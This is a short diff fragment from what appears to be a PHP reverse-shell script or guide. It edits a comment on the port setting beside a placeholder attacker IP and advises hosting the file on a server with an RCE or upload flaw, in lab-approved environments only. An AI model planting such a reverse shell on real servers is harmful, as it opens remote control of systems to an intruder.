@@ -30,7 +30,7 @@ _______________________
 __________________________
 
 $ip = 'YOUR.ATTACKER.IP';
-$port = 443; // SSL-compatible port
+$port = 443; // SSL-compatible port or any other port
 
 💡 Host on a server with RCE or upload vulnerability. Use responsibly and only in lab-approved environments.
 
